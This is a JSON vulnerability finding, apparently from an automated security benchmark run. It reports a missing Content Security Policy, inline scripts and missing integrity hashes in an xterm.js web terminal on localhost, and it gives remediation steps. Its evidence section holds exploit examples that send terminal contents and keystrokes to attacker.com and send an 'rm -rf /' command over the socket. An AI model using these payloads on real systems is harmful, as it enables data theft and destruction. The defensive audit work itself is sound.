{
  "title": "Inline Scripts Without Content Security Policy - Code Injection Risk",
  "severity": "HIGH",
  "description": "The terminal HTML page embeds inline JavaScript code without any Content Security Policy (CSP) protection. The application loads external JavaScript libraries (/xterm.js, /xterm-addon-fit.js) without Subresource Integrity (SRI) hashes, and contains a large inline script block (approximately 1 inline script tag detected) with WebSocket handlers and terminal initialization code. No Content-Security-Policy HTTP response header is set, which means the browser does not restrict script execution. This absence of CSP protection combined with inline scripts creates a critical vulnerability where any XSS injection point becomes immediately exploitable, allowing attackers to execute arbitrary JavaScript in the terminal context.\n\nThe vulnerability arises from:\n1. No Content-Security-Policy HTTP header in response\n2. One inline &lt;script&gt; block containing WebSocket connection, event handlers, and terminal logic\n3. External scripts loaded without Subresource Integrity (SRI) integrity attributes\n4. No script-src CSP directive to restrict 'unsafe-inline'\n5. Missing nonce or hash-based CSP for inline scripts\n6. Additional missing security headers (X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security)",
  "impact": "1. Any XSS vulnerability in the application becomes immediately exploitable without CSP restrictions\n2. Attacker can steal terminal data by reading the xterm.js buffer contents\n3. Attacker can inject keyloggers to capture user input and commands\n4. Attacker can modify terminal behavior, create fake prompts, or spoof system responses\n5. Attacker can establish reverse shells by connecting to attacker-controlled WebSocket servers\n6. Attacker can exfiltrate sensitive data displayed in the terminal (passwords, API keys, credentials)\n7. Attacker can hijack terminal sessions and perform unauthorized commands on behalf of users\n8. Combined with the existing authentication bypass vulnerability, this enables complete system compromise",
  "endpoint": "http://localhost:22222/",
  "evidence": "POC execution confirmed the following:\n\n1. **Missing CSP Header**: HTTP response headers contain no Content-Security-Policy directive\n2. **Inline Scripts Detected**: 1 inline &lt;script&gt; tag found without src attribute\n3. **Vulnerable JavaScript Patterns**:\n   - Found 'WebSocket' connection code in inline script\n   - Found 'socket.onmessage' handler in inline script  \n   - Found 'term.onData' handler in inline script\n4. **External Scripts Without SRI**: Two external scripts loaded without integrity attributes:\n   - &lt;script src=\"/xterm.js\"&gt; - NO SRI\n   - &lt;script src=\"/xterm-addon-fit.js\"&gt; - NO SRI\n5. **Additional Missing Headers**:\n   - X-Frame-Options (enables clickjacking)\n   - X-Content-Type-Options (enables MIME sniffing)\n   - Strict-Transport-Security (enables downgrade attacks)\n\n**Exploitation Examples**:\n```javascript\n// Steal terminal buffer contents\nlet terminalData = term.buffer.getLine(0).translateToString();\nfetch('http://attacker.com/steal?data=' + btoa(terminalData));\n\n// Establish keylogger\nterm.onData(e => {\n  fetch('http://attacker.com/log?key=' + btoa(e));\n});\n\n// Hijack terminal connection\nsocket.send(JSON.stringify({cmd: 'rm -rf /'}));\n```",
  "pocPath": "pocs/poc_csp_inline_scripts_injection.sh",
  "remediation": "1. **Implement strict Content Security Policy header**: Add to HTTP response:\n   `Content-Security-Policy: script-src 'self'; style-src 'self'; img-src 'self'; connect-src 'self' ws://localhost:22222; frame-ancestors 'none'; base-uri 'self'; form-action 'self'`\n\n2. **Move inline scripts to external files**: Extract the inline script block into `/js/terminal.js` and load via: `&lt;script src=\"/js/terminal.js\"&gt;&lt;/script&gt;`\n\n3. **Add Subresource Integrity (SRI) hashes** to external scripts:\n   - Calculate SRI hash for xterm.js: `sha384-&lt;hash&gt;` and add to script tag\n   - Calculate SRI hash for xterm-addon-fit.js: `sha384-&lt;hash&gt;` and add to script tag\n   - Load as: `&lt;script src=\"/xterm.js\" integrity=\"sha384-...\"&gt;&lt;/script&gt;`\n\n4. **Use CSP nonce for any remaining inline scripts**: Generate random nonce and add:\n   `&lt;script nonce=\"random-base64-value\"&gt;...&lt;/script&gt;`\n   Update CSP header: `script-src 'nonce-random-base64-value'`\n\n5. **Disable unsafe script execution**:\n   - Remove 'unsafe-inline' from script-src\n   - Remove 'unsafe-eval' from script-src\n   - Disable dynamic script evaluation (eval, Function constructor)\n\n6. **Implement style-src restrictions**: Set `style-src 'self'` to prevent CSS injection attacks\n\n7. **Set additional security headers**:\n   - `X-Content-Type-Options: nosniff` - prevent MIME type sniffing\n   - `X-Frame-Options: DENY` - prevent clickjacking\n   - `Strict-Transport-Security: max-age=31536000; includeSubDomains` - force HTTPS\n   - `X-XSS-Protection: 1; mode=block` - legacy XSS protection\n\n8. **Implement WebSocket-specific CSP**: Use `connect-src 'self' ws://localhost:22222` to restrict WebSocket origins\n\n9. **Validate and sanitize all user input** processed by inline scripts before execution\n\n10. **Implement Content Security Policy violation reporting**: Add `report-uri /csp-report` to log CSP violations",
  "references": "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'), CWE-693: Protection Mechanism Failure, OWASP Top 10 2021 A03:2021 â€“ Injection, OWASP Content Security Policy, Mozilla CSP Documentation, NIST SP 800-63B Security and Privacy Controls",
  "toolCallDescription": "Document the high-severity CSP + inline scripts vulnerability with confirmed POC execution",
  "timestamp": "2025-11-10T14:47:42.323Z",
  "sessionId": "benchmark-XBEN-025-24-mht8yjgo",
  "target": "./repo"
}